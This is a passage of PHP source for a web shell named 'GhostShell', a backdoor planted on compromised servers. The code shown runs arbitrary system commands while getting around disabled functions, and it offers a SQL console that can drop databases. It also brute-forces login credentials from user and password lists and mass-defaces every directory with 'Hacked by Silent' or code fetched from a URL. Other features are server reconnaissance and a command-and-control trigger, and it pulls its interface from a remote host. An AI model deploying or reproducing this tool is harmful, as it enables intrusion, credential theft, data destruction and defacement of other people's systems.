                $pathfile = $this->Dec(($this->query[0])) . $this->Dec(($this->query[1]));
                $pathfile = $this->Dec($this->GhostDirFilter($pathfile));
                if(getcwd()==$pathfile){
                    $GLOBALS['GhostSyntax'][3]($GLOBALS['GhostConfig'][2]['DOCUMENT_ROOT']);
                }
                echo "<section id='ghostrename'>";
                if(isset($GLOBALS['GhostConfig'][1]['newfile'])){
                    if(file_exists($pathfile)){
                        $ghostRen = preg_replace("/".basename($pathfile)."/i",$GLOBALS['GhostConfig'][1]['newfile'],$pathfile);
                        if(rename($pathfile,$ghostRen)){
                            $this->GhostPopupMSG(5,"","File successfully renamed!","",true);
                            echo "<script>setTimeout(function(){ window.location.replace('?ghostp=".urlencode($GLOBALS['GhostConfig'][1]['reflink'])."') },1500);</script>";
                        }else{
                            $this->GhostPopupMSG(4,null,"Permission denied!",null,true);
                        }
                    }else{
                        $this->GhostPopupMSG(4,null,"No such file/directory!",null,true);
                    }
                }else{
                    $ghostRen = preg_replace("/".basename($pathfile)."/i","",$pathfile);
                    $this->string = $ghostRen;
                    echo "<form action='' method='POST'>
                    <input type='hidden' name='reflink' value='".$this->Enc()."'>
                    <table><tr><td>
                    <label>Full path : </label></td><td>
                    <label>".$pathfile." </label></td></tr><tr>
                    <td><label>New name : </label></td><td>
                    <input type='text' name='newfile' placeholder='".basename($pathfile)."'></td></tr><tr>
                    <td></td><td><input type='submit' value='Rename'></tr>
                    </table></form>";
                }
                echo "</section>";
            break;
            case "sql":
                echo "<section class='databases'>";
                if(isset($_SESSION['sql_auth'])){
                    $sqldat = explode('|--|',$_SESSION['sql_auth']);
                    $conn = mysqli_connect($sqldat[0],$sqldat[1],$sqldat[2]);
                    if(isset($GLOBALS['GhostConfig'][1]['other'])){
                        $this->GhostPopupMSG(1,"Get Adminer","Please get adminer from link below","<a href=\'https://github.com/vrana/adminer/releases/download/v4.8.1/adminer-4.8.1-mysql-en.php\'>Adminer</a>",true);
                    }else if(isset($GLOBALS['GhostConfig'][1]['sqldrop'])){
                        $ftar = array("'",'"');
                        if(!isset($GLOBALS['GhostConfig'][0]['tbname'])){
                            mysqli_select_db($conn,$GLOBALS['GhostConfig'][0]['dbname']);
                            $dropping = str_replace($ftar,"",$GLOBALS['GhostConfig'][0]['dbname']);
                            $dropsql = "DROP DATABASE $dropping";
                            $query = mysqli_query($conn,$dropsql) or exit(mysqli_error($conn));
                            $this->GhostPopupMSG(3,null,"Database DROPPED!",null,false);
                        }else{
                            mysqli_select_db($conn,$GLOBALS['GhostConfig'][0]['dbname']);
                            $dropping = str_replace($ftar,"",$GLOBALS['GhostConfig'][0]['tbname']);
                            $dropsql = "DROP TABLE $dropping";
                            $query = mysqli_query($conn,$dropsql) or exit(mysqli_error($conn));
                            $this->GhostPopupMSG(3,null,"Table DROPPED!",null,false);
                        }
                    }else if(isset($GLOBALS['GhostConfig'][1]['sqlcommands'])){
                        if(isset($GLOBALS['GhostConfig'][0]['dbname'])){
                            mysqli_select_db($conn,$GLOBALS['GhostConfig'][0]['dbname']);
                            $inject = $GLOBALS['GhostConfig'][1]['sqlcommands'];
                            $query = mysqli_query($conn,$inject) or exit(mysqli_error($conn));
                            $this->GhostPopupMSG(3,null,"Command executed!",null,false);
                        }else{
                            $inject = $GLOBALS['GhostConfig'][1]['sqlcommands'];
                            $query = mysqli_query($conn,$inject) or exit(mysqli_error($conn));
                            $this->GhostPopupMSG(3,null,"Command executed!",null,false);
                        }
                    }else{

                        echo "<div id='sqlside'>
                        <form action='' method='POST'><input type='submit' value='Logout' name='sqllogout'></form>
                        <form action='' method='POST'><input type='submit' name='other' value='Get Adminer'></form>";
                        if(isset($GLOBALS['GhostConfig'][0]['tbname']) || isset($GLOBALS['GhostConfig'][0]['dbname'])){
                            echo "<form action='' method='POST'>
                            <input style='background:red;' type='submit' name='sqldrop' value='DROP'></form>";
                        }
                        echo "</div>
                        <form action='' method='POST'><table><tr><td><textarea name='sqlcommands' placeholder='Theres no output ,just use for edit value in database' name='sqlcmd'></textarea>
                        </td></tr><tr><td><input type='submit' value='Execute'></td></tr></table></form>";
                        echo "<div id='fieldx'><label>Connected to mysql</label><br>";

                        if(!isset($GLOBALS['GhostConfig'][0]['dbname'])){
                            echo "<button><a id='blacky' href='?ghostaction=sql'>Back</a></button><br>";
                        }else{
                            if(!isset($GLOBALS['GhostConfig'][0]['tbname'])){
                                echo "<button><a id='blacky' href='?ghostaction=sql'>Back</a></button><br>";
                            }else{
                                echo "<button><a id='blacky' href='?ghostaction=sql&dbname=".$GLOBALS['GhostConfig'][0]['dbname']."'>Back</a></button>
                                     <br>";
                            }
                        }

                        if(isset($GLOBALS['GhostConfig'][0]['dbname'])){
                            $dbs = mysqli_real_escape_string($conn,$GLOBALS['GhostConfig'][0]['dbname']);
                            $sql = "select table_name from information_schema.tables where table_schema='$dbs';";
                            $query = mysqli_query($conn,$sql) or exit(mysqli_error($conn));
                            while($fetch = mysqli_fetch_assoc($query)){
                                echo "<a href='?ghostaction=sql&dbname=".$dbs."&tbname=".$fetch['table_name'] ."'>". $fetch['table_name'] . "</a><br>";
                            }
                            echo "</div><div id='sqlcol'>";
                            if(isset($GLOBALS['GhostConfig'][0]['tbname'])){
                                if(!isset($GLOBALS['GhostConfig'][0]['limit'])){
                                    mysqli_select_db($conn,$dbs);
                                    $tbl = mysqli_real_escape_string($conn,$GLOBALS['GhostConfig'][0]['tbname']);
                                    $sql = "select column_name from information_schema.columns where table_name='$tbl'";
                                    $sql1 = "select * from $tbl limit 20";
                                    $query = mysqli_query($conn,$sql) or exit(mysqli_error($conn));
                                    $query1 = mysqli_query($conn,$sql1) or exit(mysqli_error($conn));
                                    echo "<table>";
                                    while($fetch=mysqli_fetch_assoc($query)){
                                        echo "<th>".$fetch['column_name']."</th>";
                                    }
                                    while($fetch1=mysqli_fetch_assoc($query1)){
                                        echo "<tr>";
                                        foreach($fetch1 as $key => $val){
                                            echo "<td>".$val."</td>";
                                        }
                                        echo "</tr>";
                                    }
                                    $total_row=mysqli_num_rows($query1);
                                    echo "</table>";
                                    if($total_row>0){
                                        echo "<form action='' method='GET'><table>";
                                        echo "<input type='hidden' value='sql' name='ghostaction'>";
                                        echo "<input type='hidden' value='".$dbs."' name='dbname'>";
                                        echo "<input type='hidden' value='".$tbl."' name='tbname'>";
                                        echo "<tr><td><label>Set offset,limit</label></td><td>
                                        <input type='text' placeholder='eg: 20,50' name='limit'></td></tr>
                                        <tr><td></td><td><input type='submit' value='Lets Go'></td></tr>";
                                        echo "</table></form>";
                                    }
                                    echo "</div>";
                                }else{
                                    $limits = explode(',',$GLOBALS['GhostConfig'][0]['limit']);
                                    $offset = intval($limits[0]);
                                    $limit = intval($limits[1]);
                                    mysqli_select_db($conn,$dbs);
                                    $tbl = mysqli_real_escape_string($conn,$GLOBALS['GhostConfig'][0]['tbname']);
                                    $sql = "select column_name from information_schema.columns where table_name='$tbl'";
                                    $sql1 = "select * from $tbl limit $offset,$limit";
                                    $query = mysqli_query($conn,$sql) or exit(mysqli_error($conn));
                                    $query1 = mysqli_query($conn,$sql1) or exit(mysqli_error($conn));
                                    echo "<table>";
                                    while($fetch=mysqli_fetch_assoc($query)){
                                        echo "<th>".$fetch['column_name']."</th>";
                                    }
                                    while($fetch1=mysqli_fetch_assoc($query1)){
                                        echo "<tr>";
                                        foreach($fetch1 as $key => $val){
                                            echo "<td>".$val."</td>";
                                        }
                                        echo "</tr>";
                                    }
                                    echo "</table>";
                                    $total_row=mysqli_num_rows($query1);
                                    if($total_row>0){
                                        echo "<form action='' method='GET'><table>";
                                        echo "<input type='hidden' value='sql' name='ghostaction'>";
                                        echo "<input type='hidden' value='".$dbs."' name='dbname'>";
                                        echo "<input type='hidden' value='".$tbl."' name='tbname'>";
                                        echo "<tr><td><label>Set offset,limit</label></td><td>
                                        <input type='text' placeholder='eg: 20,50' name='limit'></td></tr>
                                        <tr><td></td><td><input type='submit' value='Lets Go'></td></tr>";
                                        echo "</table></form>";
                                    }
                                    echo"</div>";
                                }

                            }
                        }else{
                            $sql = "select schema_name from information_schema.schemata";
                            $query = mysqli_query($conn,$sql) or exit(mysqli_error($conn));
                            while($fetch = mysqli_fetch_assoc($query)){
                                echo "<a href='?ghostaction=sql&dbname=".$fetch['schema_name']."'>". $fetch['schema_name'] . "</a><br>";
                            }
                            echo "</div>";
                        }

                        if(isset($GLOBALS['GhostConfig'][1]['sqllogout'])){
                            $_SESSION['sql_auth'] = null;
                            unset($_SESSION['sql_auth']);
                            echo "<script>window.location.replace('?ghostaction=sql');</script>";
                        }
                        if(isset($GLOBALS['GhostConfig'][1]['sqlcmd'])){
                            $sqlcmd = $GLOBALS['GhostConfig'][1]['sqlcmd'];
                            $qrycmd = mysqli_query($conn,$sqlcmd) or exit(mysqli_error($conn));
                            $this->GhostPopupMSG(1,"SQL Query","Command successfully executed!","",true);
                        }
                    }
                }else{
                    if(!isset($GLOBALS['GhostConfig'][1]['connect_sql'])){
                        echo explode('||',$GLOBALS['GhostSyntax'][0](self::$remote_url.'/others.html'))[4];
                    }else{
                        $tmp_conn = mysqli_connect($GLOBALS['GhostConfig'][1]['sqlhost'],$GLOBALS['GhostConfig'][1]['sqluser'],$GLOBALS['GhostConfig'][1]['sqlpass']) or exit($this->GhostPopupMSG(2,"MySQL Connection","Cannot connect to database!","",true));
                        if(!mysqli_connect_errno()){
                            $_SESSION['sql_auth'] = $GLOBALS['GhostConfig'][1]['sqlhost']."|--|".$GLOBALS['GhostConfig'][1]['sqluser']."|--|".$GLOBALS['GhostConfig'][1]['sqlpass'];
                            echo "<script>window.location.replace(window.location.href);</script>";
                        }else{
                            echo "Failed to connect mysql";
                            exit;
                        }
                    }
                }
                echo "</section>";
            break;
            case "logout":
                unset($_SESSION['Ghost_Auth']);
                session_destroy();
                echo "<script>window.location.replace('".$GLOBALS['GhostConfig'][2]['PHP_SELF']."')</script>";
            break;
            case "crack":
                if(!isset($GLOBALS['GhostConfig'][1]['crack'])){
                    echo explode('||',$GLOBALS['GhostSyntax'][0](self::$remote_url.'/others.html'))[0];
                }else{
                    $host = $GLOBALS['GhostConfig'][1]['host'];
                    $user = explode("\n",$GLOBALS['GhostConfig'][1]['userlist']);
                    $pass = explode("\n",$GLOBALS['GhostConfig'][1]['passlist']);
                    $port = $GLOBALS['GhostConfig'][1]['portc'];
                    $timeout = $GLOBALS['GhostConfig'][1]['timeout'];
                    echo "<section class='crackresults'>";
                    foreach($user as $u){
                        print("<p>Trying for user -> ".$u."</p>");
                        foreach($pass as $p){
                            $this->GhostCracker(trim($host),$port,trim($u),trim($p),trim($timeout));
                        }
                    }
                    echo "<p>Done!</p>";
                    echo "</section>";
                }
            break;
            case "mass":
                $slashtype = $this->GhostSlash();
                echo "<section class='mass'>";
                if(!isset($GLOBALS['GhostConfig'][1]['ghostmass'])){
                    echo explode('||',$GLOBALS['GhostSyntax'][0](self::$remote_url.'/others.html'))[2];
                }else{
                    $arrpath = glob($GLOBALS['GhostConfig'][1]['masspath'] . $slashtype . '*', GLOB_ONLYDIR);
                    
                    if(!empty($GLOBALS['GhostConfig'][1]['fromurl']) && 
                    $GLOBALS['GhostConfig'][1]['fromurl']!=="" &&
                    $GLOBALS['GhostConfig'][1]['fromurl']!==NULL){
                        if(filter_var($GLOBALS['GhostConfig'][1]['fromurl'], FILTER_VALIDATE_URL)){
                            $ncode = file_get_contents($GLOBALS['GhostConfig'][1]['fromurl']);
                        }else{
                            die("<script>alert('Check url');window.location.replace(window.location.href);</script>");
                        }
                    }else{
                        $ncode = $GLOBALS['GhostConfig'][1]['codemass'] ?: 'Hacked by Silent';
                    }
                    $lekluh = $GLOBALS['GhostConfig'][1]['masspath'] . $slashtype . $GLOBALS['GhostConfig'][1]['massname'];
                    $rakluh = fopen($lekluh,'w');
                    fwrite($rakluh,$ncode);
                    foreach($arrpath as $p){
                        $npath = $p . $slashtype . $GLOBALS['GhostConfig'][1]['massname'];
                        $nopen = fopen($npath,'w');
                        fwrite($nopen,$ncode);
                        fclose($nopen);
                    }
                    fclose($rakluh);
                    $this->GhostPopupMSG(1,"Mass defacements","All file successfully created!","",true);
                }
                echo "</section>";
            break;
        }
    }

    public function GhostExecute($command){
        if(isset($GLOBALS['GhostConfig'][0]['ghostp'])){
            $GLOBALS['GhostSyntax'][3]($this->Dec($GLOBALS['GhostConfig'][0]['ghostp']));
        }else{
            $GLOBALS['GhostSyntax'][3]($GLOBALS['GhostConfig'][2]['DOCUMENT_ROOT']);
        }
        if($this->GhostDat('ini','disable_functions')!=="None"){
            $disCMD = explode(",",$this->GhostDat('ini','disable_functions'));
            $disCMD = array_map('trim', $disCMD);
            foreach($GLOBALS['ghostcmd'] as $cmd){
                if(!in_array($cmd,$disCMD)){
                    $availCMD = $cmd;
                    switch($availCMD){
                        case $GLOBALS['ghostcmd'][4]:
                            return $this->GhostProcOpen($command);
                        break;
                        case $GLOBALS['ghostcmd'][1]:
                        case $GLOBALS['ghostcmd'][2]:
                            print($availCMD($command));
                            return $GLOBALS['ghostcmd'][1]($command);
                        break;
                        default:
                        return $availCMD($command);
                        break;
                    }
                    break;
                }
            }

        }else{
            return system($command);
        }
    }

    private function GhostProcOpen($command){
        $descriptorspec = array(
            0 => array('pipe', 'r'), // shell can read from STDIN
            1 => array('pipe', 'w'), // shell can write to STDOUT
            2 => array('pipe', 'w')  // shell can write to STDERR
        );
        $exec = $command;
        $process = $GLOBALS['ghostcmd'][4]($exec, $descriptorspec, $pipes, null, null);
        
        if(is_resource($process)){
            $retCMD = $GLOBALS['GhostSyntax'][14]($pipes[1]);
            echo $retCMD;
            proc_close($process);
        }else{
            echo "Fail to execute!";
        }
    }
    private function GhostWinPathCheck(){
        $partition = array("A:","B:","C:","D:","E:","F:","G:","H:","I:","J:","K:","L:","M:",
        "N:","O:","P:","Q:","R:","S:","T:","U:","V:","W:","X:","Y:","Z:");
        $available = array();
        foreach($partition as $part){
            if(is_dir($part)){
                array_push($available,$part);
            }
        }
        return $available;
    }

    private function GhostCracker($host,$port,$user,$pass,$timeout){
        $ch = curl_init();
    
        $qdata = array(
            'user'=>$user,
            'pass'=>$pass,
            'goto_uri'=>'/'
        );
    
        curl_setopt($ch, CURLOPT_URL, "https://$host:" . $port . "/login/?login_only=1");
        curl_setopt($ch, CURLOPT_HEADER, TRUE);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS, $qdata);
        curl_setopt ($ch, CURLOPT_CONNECTTIMEOUT, $timeout);
        curl_setopt($ch, CURLOPT_FAILONERROR, 1);
    
        $data = curl_exec($ch);
        $httpcode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    
        if ( curl_errno($ch) == 28 )
        {
            print "<b><font face=\"Verdana\" style=\"font-size: 9pt\">
            <font color=\"#AA0000\">Error :</font> <font color=\"#008000\">Connection Timeout
            , Sleep for 5s .</font></font></b></p>";
            sleep(5);
        }
        else if ( curl_errno($ch) == 0 )
        {
            print "<b><font face=\"Tahoma\" style=\"font-size: 9pt\" color=\"#008000\">[~]</font></b><font face=\"Tahoma\"   style=\"font-size: 9pt\"><b><font color=\"#008000\"> 
            Cracking Success With Username &quot;</font><font color=\"#FF0000\">$user</font><font color=\"#008000\">\"
            and Password \"</font><font color=\"#FF0000\">$pass</font><font color=\"#008000\">\"</font></b><br><br>";
        }
        else{
            if($httpcode===0){
                echo "No response <br>";
                curl_setopt($ch, CURLOPT_URL, "http://$host:" . $port);
                curl_setopt($ch, CURLOPT_HEADER, TRUE);
                curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
                $cont = curl_exec($ch);
                $farr = explode("URL=",$cont);
                $narr = explode('"></head>',$farr[1]);
                echo "Please change to this host -> ". $narr[0];
                exit;
            }
            //echo $httpcode;
        }
        curl_close($ch);
    }

    public function GhostCurrent($slashtype){
        echo "<div class='currentfolder'>Current folder : ";

        $truepath = array();
        
        if(isset($GLOBALS['GhostConfig'][0]['ghostp'])){
            $path = $this->GhostDirFilter($this->Dec($GLOBALS['GhostConfig'][0]['ghostp']));
            $path = $this->Dec($path);
        }else{
            $path = getcwd();
        }
        
        $ghostEP = explode($slashtype,$path);
        $ghostSZ = sizeof(($ghostEP));
        $ghostGE = "";
        for($c=0;$c<$ghostSZ;$c++){
            array_push($truepath,$ghostEP[$c]);
        }
        if($GLOBALS['GhostPlatform']!=='win'){
            $endslash = $this->GhostDirFilter($slashtype);
            echo "<a href='?ghostp=".urlencode($endslash)."'>$slashtype</a>";
        }
        for($i=0;$i<sizeof($truepath);$i++){
            if(!empty($ghostEP[$i]) || !$ghostEP[$i]==""){
                if($GLOBALS['GhostPlatform']!=='win'){
                    $ghostGE .=  $slashtype . $ghostEP[$i];
                }else{
                    $ghostGE .= $ghostEP[$i] . $slashtype ;
                }
                
                $ghostGEn = $this->GhostDirFilter($ghostGE);
                //$this->string = preg_replace('/'.$slashtype.$slashtype.'/i',$slashtype,$ghostGE);
                echo "<a href='?ghostp=".urlencode($ghostGEn)."'>$ghostEP[$i]</a>";
                echo $slashtype;
            }

        }
        
        echo "</div>";
    }

    public function GhostSOG($file){
        if($GLOBALS['GhostPlatform']!=='win'){
            $owner_file = (fileowner($file)?:0);
            $group_file = (filegroup($file)?:0);
            $checkposix = $this->GhostDat('ini','disable_functions');
            if($checkposix !=="None"){
                $checkposix = explode(",",$checkposix);
                if(!in_array("posix_getpwuid",$checkposix)){
                    $ownx = posix_getpwuid($owner_file)['name']?:'nobody';
                    $grpx = posix_getpwuid($group_file)['name'];
                    if(($ownx!==NULL && $ownx!=="") || ($grpx!==NULL && $grpx!=="")){
                        $owner_group = $ownx . ':' . ($grpx?:$ownx);
                    }else{
                        $owner_group = "nobody:nobody";
                    }
                }else{
                    $owner_group = "-:-";
                }
            }else{
                $ownx = posix_getpwuid($owner_file)['name']?:'nobody';
                $grpx = posix_getpwuid($group_file)['name'];
                if(($ownx!==NULL && $ownx!=="") || ($grpx!==NULL && $grpx!=="")){
                    $owner_group = $ownx . ':' . ($grpx?:$ownx);
                }else{
                    $owner_group = "nobody:nobody";
                }
            }
            
        }else{
            $owner_group = "-:-";
        }
        return $owner_group;
    }

    public function GhostPerms($f) { 
        $p = $GLOBALS['GhostSyntax'][1]($f);
        if (($p & 0xC000) == 0xC000) {
            $i = 's';
        } elseif (($p & 0xA000) == 0xA000) {
            $i = 'l';
        } elseif (($p & 0x8000) == 0x8000) {
            $i = '-';
        } elseif (($p & 0x6000) == 0x6000) {
            $i = 'b';
        } elseif (($p & 0x4000) == 0x4000) {
            $i = 'd';
        } elseif (($p & 0x2000) == 0x2000) {
            $i = 'c';
        } elseif (($p & 0x1000) == 0x1000) {
            $i = 'p';
        } else {
            $i = 'u';
        }
        $i .= (($p & 0x0100) ? 'r' : '-');
        $i .= (($p & 0x0080) ? 'w' : '-');
        $i .= (($p & 0x0040) ? (($p & 0x0800) ? 's' : 'x') : (($p & 0x0800) ? 'S' : '-'));
        $i .= (($p & 0x0020) ? 'r' : '-');
        $i .= (($p & 0x0010) ? 'w' : '-');
        $i .= (($p & 0x0008) ? (($p & 0x0400) ? 's' : 'x') : (($p & 0x0400) ? 'S' : '-'));
        $i .= (($p & 0x0004) ? 'r' : '-');
        $i .= (($p & 0x0002) ? 'w' : '-');
        $i .= (($p & 0x0001) ? (($p & 0x0200) ? 't' : 'x') : (($p & 0x0200) ? 'T' : '-'));
        return $i;
    }

    private function GhostMod($code){
        return substr(sprintf("%o",$code),-4);
    }

    public function GhostChange($loc,$code){
        $def = 0;
        for($i=strlen($code)-1;$i>=0;--$i)
            $def += (int)$code[$i]*pow(8, (strlen($code)-$i-1));
        if(is_dir($loc) || is_file($loc)){
            if(chmod($loc,$def)){
                return true;
            }else{
                return false;
            }
        }
    }

    public function GhostDat($ch,$value){
        switch(strtolower($ch)){
            case 'ini':
                if(strtolower($value)!=='disable_functions')
                {
                    if(!ini_get($value)){
                        return "OFF";
                    }else{
                        return "ON";
                    }
                }
                else
                {
                    if(!ini_get($value)){
                        return "None";
                    }else{
                        return ini_get($value);
                    }
                }
            break;
            case 'func':
                if(!function_exists($value)){
                    return "OFF";
                }else{
                    return "ON";
                }
            break;
        }
    }

    public function GhostInfo(){
        if($GLOBALS['GhostPlatform']==='lin'){
            $OSID = "";
        }
        $disklink = "";
        $encstr = array();
        $diskavail = $this->GhostWinPathCheck();
        foreach($diskavail as $item){
            $diskstr = $item . "\\";
            $this->string = $diskstr;
            $disklink .= "<a href='?ghostp=".$this->Enc()."'>$diskstr</a> , ";
        }
        $contents = "<div class='intros'>
Server Info : ".substr(@php_uname(),0,120)."<br>
Server Software : ".$GLOBALS['GhostConfig'][2]['SERVER_SOFTWARE']."<br>
Current User : ".get_current_user()." | Disk FreeSpace : ".$this->GhostFormat(diskfreespace($GLOBALS['GhostConfig'][2]['DOCUMENT_ROOT']))."<br>
Server Address : ".$GLOBALS['GhostConfig'][2]['SERVER_ADDR']." | 
Your Address : ".$GLOBALS['GhostConfig'][2]['REMOTE_ADDR']."<br>
Safe Mode : ".$this->GhostDat('ini','safe_mode')." |
Server Email : ".$GLOBALS['GhostConfig'][2]['SERVER_ADMIN']."<br>
Disable Functions : ".$this->GhostDat('ini','disable_functions')." | 
cURL : ".$this->GhostDat('func','curl_version')." | 
MySQL : ".$this->GhostDat('func','mysql_connect')."<br>
Document Root : ".$GLOBALS['GhostConfig'][2]['DOCUMENT_ROOT']." | Disk : ".$disklink."
</div>%{main}%";
        return $contents;
    }


    public function GhostRenderArray($array_replace,$contents){
        $arrRep = sizeof($array_replace);
        $x = 1;
        for($i=0;$i<$arrRep;$i++){
            $contents = $this->GhostRender("/%{A".$x."}%/i",$array_replace[$i],$contents);
            $x++;
        }
        return $contents;
    }

    public function GhostRender($pattern,$replace,$from){
        $contents = preg_replace($pattern,$replace,$from);
        return $contents;
    }
    public function ghostAdmin(){
        $contents = $GLOBALS['GhostSyntax'][0](self::$remote_url . "/login.html");
        return $contents;
    }
    public function ghosttart(){
        $contents = $GLOBALS['GhostSyntax'][0](self::$remote_url . "/head.html");
        $contents = preg_replace('/%{style}%/i',$GLOBALS['GhostSyntax'][0](self::$remote_url . "/ghost.css"),$contents); //example
        $contents = preg_replace('/%{js}%/i',$GLOBALS['GhostSyntax'][0](self::$remote_url . "/script.js"),$contents);
        return $contents;
    }

    public function ghostBody($location,$pattern,$from){
        $contents = $GLOBALS['GhostSyntax'][0](self::$remote_url . "/".$location);
        $from = $this->GhostRender($pattern,$contents,$from);
        return $from;
    }

    public function ghostEnd(){
        $contents = $GLOBALS['GhostSyntax'][0](self::$remote_url . "/foot.html");
        return $contents;
    }
    public function ghostDefault(){
        $this->GhostAction('upload');
        $this->GhostAction('mkdir');
        $this->GhostAction('mkfile');
    }
    public function GhostDirFilter($path){
        if($GLOBALS['GhostPlatform']!=='win'){
            $x = preg_replace("/%2F%2F/i","/",(urlencode($path)));
        }else{
            $x = preg_replace("/%5C%5C/i","\\",(urlencode($path)));
        }
        $this->string = urldecode($x);
        return $this->Enc();
    }
}

$shell = new GhostShell();

if(!isset($_SESSION['Ghost_Auth']) || empty($_SESSION['Ghost_Auth'])){
    if(isset($GLOBALS['GhostConfig'][1]['login'])){
        $shell->string = $GLOBALS['GhostConfig'][1]['password'];
        if($shell->GhostLogin(urlencode($shell->Enc()))){
            header('Location: '.$GLOBALS['GhostConfig'][2]['REQUEST_URI']);
        }
    }else{
        echo $shell->ghostAdmin();
        if(isset($GLOBALS['GhostConfig'][0]['cnc'])){
            $comex = explode(";",$GLOBALS['GhostConfig'][0]['cnc']);
            if(is_array($comex) && count($comex)>1){
                $shell->triggered($comex[0],$comex[1]);
            }
        }
    }
}else{
    //process for update
    if(isset($GLOBALS['GhostConfig'][0]['ghostd']) && isset($GLOBALS['GhostConfig'][0]['ghostp']) && isset($GLOBALS['GhostConfig'][0]['ghostaction']) ){
        if(!empty($GLOBALS['GhostConfig'][0]['ghostd']) && !empty($GLOBALS['GhostConfig'][0]['ghostp']) && $GLOBALS['GhostConfig'][0]['ghostaction']=='download')
        {
            $shell->query = array($GLOBALS['GhostConfig'][0]['ghostp'],$GLOBALS['GhostConfig'][0]['ghostd']);
            $shell->GhostAction($GLOBALS['GhostConfig'][0]['ghostaction']);
        }
        else
        {
            echo "Path/File Undefined!";
        }
    }else{
        $contents = $shell->ghosttart();
        $chead = $shell->GhostInfo();
        
       if(isset($GhostConfig[0]['ghostp'])){
           $cmdx = "?ghostp=".urlencode($GhostConfig[0]['ghostp'])."&ghostaction=cmd";
       }else{
        $cmdx = "?ghostaction=cmd";
       }

        $toReplace = array($GLOBALS['GhostConfig'][2]['PHP_SELF'],"?ghostaction=conf","?ghostaction=reverse",
                          "?ghostaction=sym","?ghostaction=crack",$cmdx,"?ghostaction=mass","?ghostaction=sql",
                          "?ghostaction=dest","?ghostaction=bombing","?ghostaction=logout");

        $contents = $shell->GhostRender("/%{body}%/i","%{GhostI}%",$contents);
        $contents = $shell->GhostRender("/%{GhostI}%/i",$chead,$contents);
        $contents = $shell->ghostBody("bodytop.html","/%{main}%/i",$contents);
        $contents = $shell->GhostRenderArray($toReplace,$contents);
        echo $contents;

        if(!isset($GhostConfig[0]['ghostp'])){
            if(!isset($GhostConfig[0]['ghostaction']) || empty($GhostConfig[0]['ghostaction']))
            {
                $shell->string = $GhostSyntax[4]();
                $shell->query = array($shell->Enc(),null);
                $shell->GhostAction("scand");
            }
            else
            {
                if(in_array($GhostConfig[0]['ghostaction'],$GLOBALS['GhostOptions'])){
                    //$shell->query = array($GhostConfig[0]['ghostp'],$GhostConfig[0]['ghostf']);
                    $shell->GhostAction($GhostConfig[0]['ghostaction']);
                    //echo "works";
                }
            }
            $shell->ghostDefault();
        }else{
            //echo "<font color='white'>".$shell->Dec($GhostConfig[0]['ghostp'])."</font><br>";
            if(isset($GhostConfig[0]['ghostf'])){
                if(!isset($GhostConfig[0]['ghostaction'])){
                    $shell->query = array($GhostConfig[0]['ghostp'],$GhostConfig[0]['ghostf']);
                    $shell->GhostAction('view');
                }else{
                    $shell->query = array($GhostConfig[0]['ghostp'],$GhostConfig[0]['ghostf']);
                    $shell->GhostAction($GhostConfig[0]['ghostaction']);
                }
            }else{

                if(isset($GhostConfig[0]['ghostaction'])){
                    $shell->query = array($GhostConfig[0]['ghostp'],null);
                    $shell->GhostAction($GhostConfig[0]['ghostaction']);
                }else{
                    $shell->query = array($GhostConfig[0]['ghostp'],null);
                    $shell->GhostAction('scand');
                }
            }
            $shell->query = array($GhostConfig[0]['ghostp'],null);
            $shell->ghostDefault();
        }

        if(isset($GhostConfig[1]['toencstr'])){
            $shell->string = $GhostConfig[1]['encstr'];
            $shell->GhostPopupMSG(1,"Encryption for ".$GhostConfig[1]['encstr'],$shell->Enc(),"So you can change password",true);
        }
        $shell->GhostAction("zipping");
        $shell->GhostAction("massdel");
        $footer = $shell->ghostEnd();
        preg_match('/[0-9]\.[0-9]/i',$_SESSION['latest'],$match);
        $latestVersion = "V".($match[0]);
        if($_SESSION['need_update']){
            echo "<script>
            alert('New version available!\\nLatest version : ".$latestVersion."')
            </script>";
        }
        print($footer);
    }
}?>
